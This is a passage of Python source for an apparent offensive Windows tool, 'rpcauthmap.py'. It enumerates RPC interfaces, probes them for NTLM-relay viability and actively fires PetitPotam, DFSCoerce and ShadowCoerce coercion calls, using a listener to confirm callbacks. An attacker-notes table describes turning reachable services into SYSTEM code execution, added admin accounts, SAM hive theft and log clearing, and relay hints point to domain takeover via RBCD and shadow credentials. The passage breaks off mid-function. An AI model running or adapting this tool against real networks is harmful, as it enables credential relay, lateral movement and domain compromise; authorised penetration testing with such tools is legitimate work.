#!/usr/bin/env python3
# rpcauthmap.py  (v2)
#
# RPC endpoint mapper + capability classifier + authentication-coercion prober
# (Impacket / Python 3). Based originally on CORE/Fortra's rpcdump.py and the
# ifids/brute approach of impacket's rpcmap.py; coercion method definitions are
# adapted from public PoCs (topotam PetitPotam, DFSCoerce, ShadowCoerce).
#
# WHAT IT DOES, per target, in stages:
#
#   STAGE 1  DISCOVERY  -- find every RPC interface, not just the advertised ones
#     1a. Endpoint-mapper query (TCP/135): returns each registered interface and
#         its exact bindings, including the dynamic ncacn_ip_tcp high port, so no
#         port scan is needed for those.
#     1b. Named-pipe enumeration over SMB (\\host\IPC$): lists pipes that exist
#         whether or not the endpoint mapper advertised them.
#     1c. MGMT inq_if_ids: ask each reachable endpoint which interface UUIDs it
#         actually serves, surfacing interfaces the mapper never listed.
#     1d. Optional UUID brute-bind (--brute): confirm presence of known UUIDs on
#         an endpoint whose management interface refuses to answer.
#     Both transports are considered: an interface exposed on ncacn_ip_tcp but not
#     on a pipe (or vice versa) is still found and recorded.
#
#   STAGE 2  CLASSIFY  -- say what each interface *can* do, not just its name
#     Every discovered UUID is looked up in a known-interface table for a human
#     name, and in a coercion table that marks interfaces with a method that
#     takes a REMOTE-TARGET argument (a UNC path, a \\server name, or a share),
#     i.e. the shape that can be made to authenticate outbound. "Takes a path" is
#     only the EFS-flavoured subset; server/share arguments count too.
#
#   STAGE 3  RELAY-DESTINATION PROBE  -- (original behaviour, preserved)
#     For each interface, bind at escalating auth levels to find the lowest the
#     server accepts (its enforced floor):
#         none      -> unauthenticated bind allowed
#         connect   -> authenticated but UNSIGNED bind allowed  (relay-viable IN)
#         integrity -> packet integrity (signing) required
#         privacy   -> integrity + encryption required
#     A relayed NTLM session cannot sign, so a "connect" floor = candidate relay
#     DESTINATION. This is about relaying TO the endpoint.
#
#   STAGE 4  COERCION PROBE  -- (new; opt-in with --coerce)
#     For interfaces classified as coercible, actually call the triggering method
#     with a UNC pointing at our own listener, then watch a local listener for an
#     inbound connection from the target within --coerce-timeout seconds. A
#     callback = confirmed coercion SOURCE. This is about the endpoint emitting
#     auth to YOU. Requires a listener bind (default TCP/445) and an --listener-ip
#     the target can route back to. Fired only against methods whose argument we
#     know, because for an unknown interface we cannot know which argument is the
#     remote target without fuzzing (see --note-unknown).
#
# OUTPUT: by default only positive / interesting rows are shown (relay-viable
# destinations, and confirmed/ candidate coercion sources). --verbose/--show-all
# prints every interface and every dead host. Colour highlights the hits.
#
# For AUTHORIZED security testing only. Coercion actively induces the target to
# authenticate to you; do not run --coerce outside an engagement with scope.

import os
import sys
import ssl
import time
import socket
import logging
import argparse
import ipaddress
import threading
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed

# ldap3 is optional; only needed for the --relay-checks LDAP/LDAPS probes.
try:
    from ldap3 import Server, Connection, NTLM, Tls
    _HAVE_LDAP3 = True
except ImportError:
    _HAVE_LDAP3 = False

try:
    from impacket import version, uuid as iuuid
    from impacket.dcerpc.v5 import transport, epm
    from impacket.dcerpc.v5.ndr import NDRCALL
    from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, DWORD
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHN_LEVEL_NONE,
        RPC_C_AUTHN_LEVEL_CONNECT,
        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        DCERPCException,
    )
    from impacket.dcerpc.v5 import mgmt
    from impacket.uuid import (uuidtup_to_bin, bin_to_uuidtup, string_to_bin,
                               bin_to_string)
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    sys.stderr.write('[-] impacket import failed: %s\n'
                     '    Install/upgrade impacket in the same interpreter: '
                     'pip install --upgrade impacket --break-system-packages\n' % e)
    sys.exit(1)


# --------------------------------------------------------------------------- #
# Colour
# --------------------------------------------------------------------------- #
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[31m'
    BRED = '\033[1;31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    GREY = '\033[90m'


_NOCOLOR = False


def c(text, colour):
    if _NOCOLOR:
        return text
    return '%s%s%s' % (colour, text, C.RESET)


import re as _re
_ANSI = _re.compile(r'\033\[[0-9;]*m')


def strip_ansi(s):
    return _ANSI.sub('', s)


# --------------------------------------------------------------------------- #
# Auth levels, lowest -> highest. 'none' is unauthenticated; rest use NTLMSSP.
# --------------------------------------------------------------------------- #
AUTH_LEVELS = [
    ('none', RPC_C_AUTHN_LEVEL_NONE),
    ('connect', RPC_C_AUTHN_LEVEL_CONNECT),
    ('integrity', RPC_C_AUTHN_LEVEL_PKT_INTEGRITY),
    ('privacy', RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
]

# A "connect" or "none" floor means no signing is enforced -> relay-viable IN.
RELAY_VIABLE_FLOORS = ('none', 'connect')


# --------------------------------------------------------------------------- #
# Known interface names (subset; extend freely). UUID (lowercase) -> label.
# --------------------------------------------------------------------------- #
KNOWN_INTERFACES = {
    'c681d488-d850-11d0-8c52-00c04fd90f7e': 'MS-EFSR (EFS, via lsarpc)',
    'df1941c5-fe89-4e79-bf10-463657acf44d': 'MS-EFSR (EFS, via efsrpc)',
    '12345678-1234-abcd-ef00-0123456789ab': 'MS-RPRN (Print System Remote)',
    '76f03f96-cdfd-44fc-a22c-64950a001209': 'MS-PAR (Print Async Remote)',
    '4fc742e0-4a10-11cf-8273-00aa004ae673': 'MS-DFSNM (DFS Namespace Mgmt)',
    'a8e0653c-2744-4389-a61d-7373df8b2292': 'MS-FSRVP (File Server VSS)',
    '12345778-1234-abcd-ef00-0123456789ac': 'MS-SAMR (SAM Remote)',
    '12345778-1234-abcd-ef00-0123456789ab': 'MS-LSAD/LSARPC',
    '367abb81-9844-35f1-ad32-98f038001003': 'MS-SCMR (Service Control)',
    '86d35949-83c9-4044-b424-db363231fd0c': 'MS-TSCH (Task Scheduler)',
    '378e52b0-c0a9-11cf-822d-00aa0051e40f': 'MS-TSCH (ATSvc)',
    'f6beaff7-1e19-4fbb-9f8f-b89e2018337c': 'MS-EVEN6 (EventLog)',
    '338cd001-2244-31f1-aaaa-900038001003': 'MS-RRP (Remote Registry)',
    '3919286a-b10c-11d0-9ba8-00c04fd92ef5': 'MS-DSSP (Directory Services)',
}


# Attacker-oriented note per interface: what relaying in / reaching it buys you,
# or that it is a coercion source. Keyed by lowercase UUID.
INTERFACE_NOTES = {
    '367abb81-9844-35f1-ad32-98f038001003':
        'SCMR: create/start a service = RCE as SYSTEM (PsExec-style). '
        'Relay an ADMIN here.',
    '12345778-1234-abcd-ef00-0123456789ac':
        'SAMR: read/add/modify local accounts (e.g. add a local admin), '
        'enumerate users.',
    '12345778-1234-abcd-ef00-0123456789ab':
        'LSARPC: enumerate SIDs, trusts, privileges, policy.',
    '86d35949-83c9-4044-b424-db363231fd0c':
        'Task Scheduler: create a scheduled task = code execution.',
    '378e52b0-c0a9-11cf-822d-00aa0051e40f':
        'Task Scheduler (ATSvc): schedule a task = code execution.',
    '1ff70682-0a51-30e8-076d-740be8cee98b':
        'Task Scheduler (ATSvc): schedule a task = code execution.',
    'f6beaff7-1e19-4fbb-9f8f-b89e2018337c':
        'EVEN6: read/clear the Windows event logs.',
    '338cd001-2244-31f1-aaaa-900038001003':
        'Remote Registry: read/write registry remotely (e.g. save SAM/SYSTEM '
        'hives).',
    '3919286a-b10c-11d0-9ba8-00c04fd92ef5':
        'DSSP: directory-services setup / role info.',
    '12345678-1234-abcd-ef00-0123456789ab':
        'SPOOLER: coercion source (PrinterBug) - forces machine-account auth '
        'outbound.',
    '76f03f96-cdfd-44fc-a22c-64950a001209':
        'Async print: same coercion surface as the spooler.',
    '4fc742e0-4a10-11cf-8273-00aa004ae673':
        'DFSNM: coercion source (DFSCoerce) - forces outbound auth.',
    'c681d488-d850-11d0-8c52-00c04fd90f7e':
        'EFSR via lsarpc: coercion source (PetitPotam) - forces outbound auth.',
    'df1941c5-fe89-4e79-bf10-463657acf44d':
        'EFSR via efsrpc: coercion source (PetitPotam) - forces outbound auth.',
    'a8e0653c-2744-4389-a61d-7373df8b2292':
        'FSRVP: coercion source (ShadowCoerce) - forces outbound auth.',
    '4b324fc8-1670-01d3-1278-5a47bf6ee188':
        'Server service (srvsvc): enumerate shares and sessions.',
    '6bffd098-a112-3610-9833-46c3f87e345a':
        'Workstation service (wkssvc): enumerate logged-on users, domain info.',
    '51a227ae-825b-41f2-b4a9-1ac9557a1018':
        'NGC key service (lsass): credential/key surface.',
    '8fb74744-b2ff-4c00-be0d-9ef9a191fe1b':
        'NGC key service (lsass): credential/key surface.',
    'b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86':
        'KeyIso (lsass): key isolation / DPAPI-NG surface.',
}


# --------------------------------------------------------------------------- #
# Coercion method definitions.
#
# Each entry: interface label, the pipe(s) it is reachable on, the interface
# UUID+version to bind, and a list of trigger methods. Each trigger is a
# callable fire(dce, unc) that issues the request with `unc` placed in the
# remote-target argument and returns None (we only care that it was sent; the
# server throwing ERROR_BAD_NETPATH / rpc_s_* after dialing us is success).
#
# We define the minimal NDRCALL structures inline (same approach as the public
# PoCs) so the tool does not depend on those modules being importable.
# --------------------------------------------------------------------------- #

# ---- MS-EFSR ----
class _EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (('fileName', WSTR), ('Flag', ULONG))


class _EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (('FileName', WSTR),)


def _fire_efs_openfileraw(dce, unc):
    r = _EfsRpcOpenFileRaw()
    r['fileName'] = unc + '\x00'
    r['Flag'] = 0
    dce.request(r)


def _fire_efs_encryptfilesrv(dce, unc):
    r = _EfsRpcEncryptFileSrv()
    r['FileName'] = unc + '\x00'
    dce.request(r)


# ---- MS-DFSNM : NetrDfsAddStdRoot (opnum 12) ----
class _NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('Comment', WSTR),
        ('ApiFlags', DWORD),
    )


def _fire_dfs_addstdroot(dce, unc):
    # unc is \\listener ; strip leading slashes for ServerName
    server = unc.lstrip('\\')
    r = _NetrDfsAddStdRoot()
    r['ServerName'] = server + '\x00'
    r['RootShare'] = 'x\x00'
    r['Comment'] = '\x00'
    r['ApiFlags'] = 0
    dce.request(r)


# ---- MS-FSRVP : IsPathSupported (opnum 8) ----
class _IsPathSupported(NDRCALL):
    opnum = 8
    structure = (('ShareName', WSTR),)


def _fire_fsrvp_ispathsupported(dce, unc):
    r = _IsPathSupported()
    r['ShareName'] = unc + '\\x\x00'
    dce.request(r)


# interface_uuid (lowercase) -> coercion descriptor
COERCION_DB = {
    'c681d488-d850-11d0-8c52-00c04fd90f7e': {
        'label': 'MS-EFSR',
        'uuidtup': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'),
        'pipes': ['lsarpc', 'efsrpc', 'samr', 'lsass', 'netlogon'],
        'triggers': [
            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
        ],
    },
    'df1941c5-fe89-4e79-bf10-463657acf44d': {
        'label': 'MS-EFSR (efsrpc iface)',
        'uuidtup': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'),
        'pipes': ['efsrpc'],
        'triggers': [
            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
        ],
    },
    '4fc742e0-4a10-11cf-8273-00aa004ae673': {
        'label': 'MS-DFSNM',
        'uuidtup': ('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0'),
        'pipes': ['netdfs'],
        'triggers': [
            ('NetrDfsAddStdRoot', 'ServerName', _fire_dfs_addstdroot),
        ],
    },
    'a8e0653c-2744-4389-a61d-7373df8b2292': {
        'label': 'MS-FSRVP',
        'uuidtup': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0'),
        'pipes': ['FssagentRpc'],
        'triggers': [
            ('IsPathSupported', 'ShareName', _fire_fsrvp_ispathsupported),
        ],
    },
    # MS-RPRN is coercible too but requires an RpcOpenPrinter handle sequence;
    # left out of the auto-fire set to keep the active test single-call. It is
    # still reported as a coercible interface in STAGE 2.
}

RPRN_UUID = '12345678-1234-abcd-ef00-0123456789ab'

# Expected "it dialed us then failed to find the file" errors == coercion sent.
_EXPECTED_COERCE_ERRORS = (
    'ERROR_BAD_NETPATH', 'rpc_s_access_denied', 'ERROR_BAD_NET_NAME',
    'STATUS_BAD_NETWORK_NAME', 'ERROR_ACCESS_DENIED', 'STATUS_OBJECT_PATH_NOT_FOUND',
)


# --------------------------------------------------------------------------- #
# Callback listener: a bare TCP accept loop that records which source IPs
# connected. A connect-back from the target proves it was coerced; we do not
# need to complete NTLM to know the trigger fired.
# --------------------------------------------------------------------------- #
class CallbackListener(object):
    def __init__(self, bind_ip, port):
        self.bind_ip = bind_ip
        self.port = port
        self._seen = set()
        self._lock = threading.Lock()
        self._sock = None
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.bind_ip, self.port))
        self._sock.listen(50)
        self._sock.settimeout(0.5)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with self._lock:
                self._seen.add(addr[0])
            try:
                conn.close()
            except OSError:
                pass

    def saw(self, ip):
        with self._lock:
            return ip in self._seen

    def clear(self, ip):
        with self._lock:
            self._seen.discard(ip)

    def stop(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass


# --------------------------------------------------------------------------- #
# Core
# --------------------------------------------------------------------------- #
_print_lock = threading.Lock()

# Application/IPC pipes that are not RPC services. We drop these so the pipe
# discovery focuses on real RPC endpoints. Any pipe with a sub-path backslash or
# a GUID-style name is also treated as noise.
_PIPE_NOISE = (
    'mojo.', 'crashpad', 'dotnet-diagnostic', 'vmware', 'vmx', 'nvmessagebus',
    'nvwks', 'googledrivefs', 'bravesoftware', 'pshost.', 'qt-',
    'systemusagereport', 'wifinetworkmanager', 'privateinternetaccess',
    'openvpn', 'kapspipe', 'msftewds', 'pipe_eventroot', 'appcontracts',
    'backingapp', 'fthpipe', 'nvcontainer', 'catalogchangelistener', 'devios',
    'dsaservice', 'dsatrayservice', 'bittorrent', 'chrome.',
)

# Bare GUID-named pipes (no braces) are per-process app IPC, not RPC services.
_GUID_PIPE_RE = _re.compile(
    r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
    r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')


def _is_noise_pipe(name):
    if '\\' in name or '{' in name:
        return True
    if _GUID_PIPE_RE.match(name):
        return True
    low = name.lower()
    return any(tok in low for tok in _PIPE_NOISE)


class RPCAuthMap(object):
    def __init__(self, username, password, domain, hashes, timeout,
                 show_all, probe_pipes, do_brute, do_coerce,
                 listener=None, listener_ip=None, coerce_timeout=5, debug=False,
                 relay_checks=False):
        self.debug = debug
        self.relay_checks = relay_checks
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        if hashes:
            self.lmhash, self.nthash = hashes.split(':')
        # Anonymous run: no username and no hash. Authenticated-level binds are
        # meaningless and can stall, so the floor probe is skipped in this mode.
        self.anon = not (username or self.nthash)
        self.timeout = timeout
        self.show_all = show_all
        self.probe_pipes = probe_pipes
        self.do_brute = do_brute
        self.do_coerce = do_coerce
        self.listener = listener
        self.listener_ip = listener_ip
        self.coerce_timeout = coerce_timeout

    # ---- debug helper ----------------------------------------------------- #
    def _dbg(self, stage, host, err):
        if self.debug:
            with _print_lock:
                sys.stderr.write(c('    [dbg %s %s] %r\n'
                                   % (stage, host, err), C.GREY))

    # ---- credential helper ------------------------------------------------ #
    def _set_creds(self, rpctransport):
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(
                self.username, self.password, self.domain,
                self.lmhash, self.nthash)

    # ---- STAGE 1a : endpoint mapper -------------------------------------- #
    def enum_epmapper(self, host):
        """Return list of dicts: {uuid, binding}. hept_lookup makes its own
        connection+bind, so we must NOT pre-bind the portmap interface or the
        second (internal) bind is rejected."""
        out = []
        try:
            resp = epm.hept_lookup(host)
        except Exception as e:
            self._dbg('epmapper', host, e)
            return out

        # Each entry: entry['tower']['Floors']; floors[0] stringifies to
        # "<UUID> v<maj>.<min>"; PrintStringBinding(floors) gives the binding.
        for entry in resp or []:
            try:
                tower = entry['tower']['Floors']
            except Exception:
                continue
            uuid_str = ''
            ver = '1.0'
            binding = ''
            try:
                # str(floors[0]) is like "<UUID> v<maj>.<min>"
                parts = str(tower[0]).split(' ')
                uuid_str = parts[0].lower()
                if len(parts) > 1 and parts[1].lower().startswith('v'):
                    ver = parts[1][1:]
            except Exception:
                pass
            try:
                binding = epm.PrintStringBinding(tower)
            except Exception:
                binding = ''
            out.append({'uuid': uuid_str, 'binding': binding, 'ver': ver})
        return out

    # ---- STAGE 1b : SMB pipe enumeration --------------------------------- #
    def enum_pipes(self, host):
        pipes = []
        try:
            smb = SMBConnection(host, host, timeout=self.timeout)
            smb.login(self.username, self.password, self.domain,
                      self.lmhash, self.nthash)
            for f in smb.listPath('IPC$', '\\*'):
                name = f.get_longname()
                if name in ('.', '..') or _is_noise_pipe(name):
                    continue
                pipes.append(name)
            try:
                smb.logoff()
            except Exception:
                pass
        except Exception as e:
            self._dbg('pipes', host, e)
        return pipes

    # ---- STAGE 1c : MGMT inq_if_ids on one endpoint ---------------------- #
    def query_ifids(self, stringbinding):
        uuids = []
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_connect_timeout(self.timeout)
        self._set_creds(rpctransport)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(mgmt.MSRPC_UUID_MGMT)
            resp = mgmt.hinq_if_ids(dce)
            vector = resp['if_id_vector']
            count = vector['count']
            for i in range(count):
                try:
                    entry = vector['if_id'][i]
                    u = bin_to_string(entry['Uuid']).lower()
                    ver = '%d.%d' % (entry['VersMajor'], entry['VersMinor'])
                    uuids.append((u, ver))
                except Exception:
                    continue
        except Exception as e:
            # Field names vary across impacket versions; if this raises, the
            # mapper/pipe discovery still stands. Validate on the Kali box and
            # adjust 'if_id_vector'/'Count'/'if_id' if needed.
            self._dbg('ifids', stringbinding, e)
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
        return uuids

    # ---- STAGE 1d : UUID brute-bind -------------------------------------- #
    def brute_bind(self, stringbinding):
        found = []
        for u in list(KNOWN_INTERFACES.keys()):
            try:
                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_connect_timeout(self.timeout)
                self._set_creds(rpctransport)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(uuidtup_to_bin((u, '1.0')))
                found.append((u, '1.0'))
                dce.disconnect()
            except Exception:
                continue
        return found

    # ---- SMB signing posture (the real relay gate for pipe endpoints) ---- #
    def get_smb_signing(self, host):
        """True = signing required (pipe relay blocked), False = not required,
        None = could not determine."""
        try:
            smb = SMBConnection(host, host, timeout=self.timeout)
            try:
                smb.login(self.username, self.password, self.domain,
                          self.lmhash, self.nthash)
            except Exception:
                pass  # negotiate already carries the signing flag
            req = smb.isSigningRequired()
            try:
                smb.logoff()
            except Exception:
                pass
            return req
        except Exception as e:
            self._dbg('smbsign', host, e)
            return None

    # ---- STAGE 3 : relay-destination auth floor -------------------------- #
    def probe_floor(self, stringbinding, uuid_str, ver='1.0'):
        """Lowest auth level the endpoint accepts at bind, or None."""
        for name, level in AUTH_LEVELS:
            try:
                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_connect_timeout(self.timeout)
                if name != 'none':
                    self._set_creds(rpctransport)
                dce = rpctransport.get_dce_rpc()
                if name != 'none':
                    dce.set_auth_type(RPC_C_AUTHN_WINNT)
                    dce.set_auth_level(level)
                dce.connect()
                try:
                    dce.bind(uuidtup_to_bin((uuid_str, ver)))
                except Exception:
                    dce.disconnect()
                    continue
                dce.disconnect()
                return name
            except Exception:
                continue
        return None

    # ---- STAGE 4 : active coercion probe --------------------------------- #
    def coerce_probe(self, host, descriptor):
        """Try each trigger of a coercible interface; return list of hits.
        A hit = the listener saw a connect-back from host, OR the server threw
        one of the expected post-dial errors (dialed us but no such file)."""
        hits = []
        unc = '\\\\%s\\%s\\file' % (self.listener_ip, _rand_tag())
        for pipe in descriptor['pipes']:
            sb = r'ncacn_np:%s[\PIPE\%s]' % (host, pipe)
            for method_name, arg_name, fire in descriptor['triggers']:
                self._coerce_one(host, sb, descriptor, pipe, method_name,
                                 fire, unc, hits)
                if any(h['method'] == method_name and h['confirmed'] for h in hits):
                    # already confirmed via this method on this pipe; move on
                    break
        return hits

    def _coerce_one(self, host, sb, descriptor, pipe, method_name, fire, unc, hits):
        if self.listener:
            self.listener.clear(host)
        rpctransport = transport.DCERPCTransportFactory(sb)
        rpctransport.set_connect_timeout(self.timeout)
        self._set_creds(rpctransport)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(uuidtup_to_bin(descriptor['uuidtup']))
        except Exception:
            return
        sent_ok = False
        try:
            fire(dce, unc)
            sent_ok = True  # no exception: call accepted
        except Exception as e:
            es = str(e)
            if any(code in es for code in _EXPECTED_COERCE_ERRORS):
                sent_ok = True  # expected post-dial failure == it reached out
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
        if not sent_ok:
            return
        # Give the target a moment to dial the listener.
        confirmed = False
        if self.listener:
            deadline = time.time() + self.coerce_timeout
            while time.time() < deadline:
                if self.listener.saw(host):
                    confirmed = True
                    break
                time.sleep(0.25)
        hits.append({
            'iface': descriptor['label'], 'pipe': pipe,
            'method': method_name, 'confirmed': confirmed,
        })

    # ---- orchestration per host ------------------------------------------ #
    def scan(self, host):
        lines = []
        relay_count = 0
        coerce_count = 0

        ep = self.enum_epmapper(host)
        pipes = self.enum_pipes(host) if self.probe_pipes else []

        if not ep and not pipes:
            return host, (0, 0, [c('[-] %s: no RPC reachable' % host, C.GREY)],
                          'quiet', {'host': host, 'coercibles': [],
                                    'rpc_relay': [], 'smb_signing': None,
                                    'ldap': None, 'ldaps': None, 'esc8': []})

        # Build a merged interface view: uuid -> set of stringbindings, plus
        # uuid -> interface version (so binds use the real version).
        iface_bindings = {}
        iface_versions = {}
        for e in ep:
            u = e['uuid']
            if not u:
                continue
            iface_bindings.setdefault(u, set())
            if e['binding']:
                iface_bindings[u].add(e['binding'])
            iface_versions.setdefault(u, e.get('ver') or '1.0')

        # Pipe-sourced discovery: ask each pipe what it serves (ifids), and
        # record ncacn_np bindings for anything found.
        for pipe in pipes:
            sb = r'ncacn_np:%s[\PIPE\%s]' % (host, pipe)
            served = self.query_ifids(sb)
            if not served and self.do_brute:
                served = self.brute_bind(sb)
            for u, ver in served:
                iface_bindings.setdefault(u, set()).add(sb)
                iface_versions.setdefault(u, ver or '1.0')

        # SMB signing matters only for the relay-DESTINATION role (relaying INTO
        # this host, or a self-reflection). It is irrelevant to using this host
        # as a coercion SOURCE.
        smb_signing = None if self.anon else self.get_smb_signing(host)

        coercibles = []     # {uuid, label, how, auto, confirmed}
        relay_viables = []  # {uuid, label, binding, floor, is_pipe}
        detail_rows = []    # full per-iface blocks for --show-all

        for u, bindings in sorted(iface_bindings.items()):
            name = KNOWN_INTERFACES.get(u, 'unknown interface')
            coercible = (u in COERCION_DB) or (u == RPRN_UUID)
            ver = iface_versions.get(u, '1.0')
            sb_list = sorted(bindings)
            # Probe remote transports only, TCP first, pipe as fallback. An
            # interface with only ncalrpc bindings is local-only (reachable only
            # from a process ON that box), so there is nothing to probe remotely.
            probe_order = [b for b in sb_list if b.startswith('ncacn_ip_tcp')] + \
                          [b for b in sb_list if b.startswith('ncacn_np')]
            remote_reachable = bool(probe_order)
            floor = None
            used_sb = None
            if not self.anon:
                for b in probe_order:
                    f = self.probe_floor(b, u, ver)
                    if f is not None:
                        floor = f
                        used_sb = b
                        break
            relay_viable = floor in RELAY_VIABLE_FLOORS
            is_pipe = bool(used_sb and used_sb.startswith('ncacn_np'))
            blocked_by_smb = is_pipe and (smb_signing is True)
            effective_relay = relay_viable and not blocked_by_smb

            if effective_relay:
                relay_count += 1
                relay_viables.append({'uuid': u, 'label': name,
                                      'binding': used_sb, 'floor': floor,
                                      'is_pipe': is_pipe})

            if coercible:
                if u == RPRN_UUID:
                    entry = {'uuid': u, 'label': 'MS-RPRN (Print Spooler)',
                             'how': 'RpcRemoteFindFirstPrinterChangeNotificationEx '
                                    'takes a UNC server argument',
                             'auto': False, 'confirmed': None}
                else:
                    desc = COERCION_DB[u]
                    methods = ', '.join(m[0] for m in desc['triggers'])
                    entry = {'uuid': u, 'label': desc['label'],
                             'how': '%s take a UNC/server argument' % methods,
                             'auto': True, 'confirmed': None}
                    if self.do_coerce:
                        hits = self.coerce_probe(host, desc)
                        if any(h['confirmed'] for h in hits):
                            entry['confirmed'] = True
                            coerce_count += 1
                        elif hits:
                            entry['confirmed'] = False
                coercibles.append(entry)

            if self.show_all:
                blk = ['    %s  %s' % (
                    c(name, C.BOLD) if name != 'unknown interface'
                    else c(name, C.YELLOW), c(u, C.GREY))]
                note = INTERFACE_NOTES.get(u)
                if note:
                    blk.append(c('        use: %s' % note, C.CYAN))
                for b in sb_list:
                    blk.append(c('        %s' % b, C.GREY))
                if not remote_reachable:
                    blk.append(c('        local only (ncalrpc) - not reachable '
                                 'over the network, cannot test', C.GREY))
                elif floor is None:
                    blk.append(c('        floor: inconclusive (remote bind '
                                 'failed)', C.GREY))
                elif effective_relay:
                    blk.append(c('        floor=%s -> relay VIABLE' % floor, C.RED))
                elif blocked_by_smb:
                    blk.append(c('        floor=%s open but SMB signing blocks '
                                 'pipe relay' % floor, C.GREEN))
                else:
                    blk.append(c('        floor=%s -> protected' % floor, C.GREEN))
                detail_rows.append(blk)

        # ---------------- render ---------------- #
        lines.append(c('[*] %s' % host, C.BOLD + C.CYAN))

        # == COERCION SOURCE ==
        lines.append(c('  == COERCION SOURCE ==', C.BOLD + C.CYAN))
        lines.append(c('     can this host be made to authenticate to you? '
                       '(its own SMB signing does NOT matter here)', C.GREY))
        if coercibles:
            for e in coercibles:
                if e['confirmed'] is True:
                    verdict = c('CONFIRMED', C.BOLD + C.GREEN)
                elif e['confirmed'] is False:
                    verdict = c('LIKELY (call sent, no callback)', C.YELLOW)
                else:
                    verdict = c('CANDIDATE', C.YELLOW)
                lines.append('     %s  %s  %s'
                             % (verdict, c(e['label'], C.BOLD),
                                c(e['uuid'], C.GREY)))
                lines.append(c('        why: %s' % e['how'], C.GREY))
                if not e['auto']:
                    lines.append(c('        note: needs a handle sequence, not '
                                   'auto-fired; trigger with printerbug', C.GREY))
        else:
            lines.append(c('     none  (no coercible interface exposed)', C.GREEN))

        # == RELAY DESTINATION ==
        sign_txt = ('REQUIRED' if smb_signing is True else 'not required'
                    if smb_signing is False else 'unknown')
        sign_col = (C.GREEN if smb_signing is True else C.RED
                    if smb_signing is False else C.GREY)
        lines.append(c('  == RELAY DESTINATION ==', C.BOLD + C.CYAN))
        lines.append('     %s' % c('SMB signing: %s' % sign_txt, sign_col))
        lines.append(c('     could you relay a captured NTLM auth INTO this host? '
                       'VIABLE = nothing signs the path', C.GREY))
        if relay_viables:
            for r in relay_viables:
                how = ('direct TCP, no SMB layer' if not r['is_pipe']
                       else 'pipe, SMB signing off')
                lines.append('     %s  %s  %s'
                             % (c('VIABLE', C.BRED), c(r['label'], C.BOLD),
                                c(r['uuid'], C.GREY)))
                lines.append(c('        %s  (floor=%s, %s)'
                               % (r['binding'], r['floor'], how), C.GREY))
                rnote = INTERFACE_NOTES.get(r['uuid'])
                if rnote:
                    lines.append(c('        use: %s' % rnote, C.CYAN))
        elif smb_signing is True:
            lines.append(c('     none  (SMB signing REQUIRED blocks every '
                           'named-pipe relay on this host)', C.GREEN))
        else:
            lines.append(c('     none viable', C.GREEN))

        # == CROSS-PROTOCOL RELAY TARGETS (LDAP / LDAPS / ADCS) ==
        ldap_viable = []
        ls = cb = None
        esc8 = []
        if self.relay_checks:
            lines.append(c('  == CROSS-PROTOCOL RELAY TARGETS ==', C.BOLD + C.CYAN))
            lines.append(c('     where a coerced machine account could be relayed '
                           'for domain takeover', C.GREY))

            ls = check_ldap_signing(host, self.timeout)
            lcol = (C.BRED if 'NOT required' in ls else C.GREEN
                    if ls == 'required' else C.GREY)
            lines.append('     LDAP signing (389): %s' % c(ls, lcol))
            if 'NOT required' in ls:
                ldap_viable.append('LDAP')
                lines.append(c('        -> relay here to write RBCD or shadow '
                               'credentials (then S4U/PKINIT)', C.CYAN))

            cb = check_ldaps_channel_binding(host, self.timeout)
            ccol = (C.BRED if 'NOT required' in cb else C.GREEN
                    if cb == 'required' else C.GREY)
            lines.append('     LDAPS channel binding (636): %s' % c(cb, ccol))
            if 'NOT required' in cb:
                ldap_viable.append('LDAPS')
                lines.append(c('        -> relay HTTP-origin auth here for the '
                               'same RBCD / shadow-cred writes', C.CYAN))

            esc8 = check_esc8(host, self.timeout)
            if esc8:
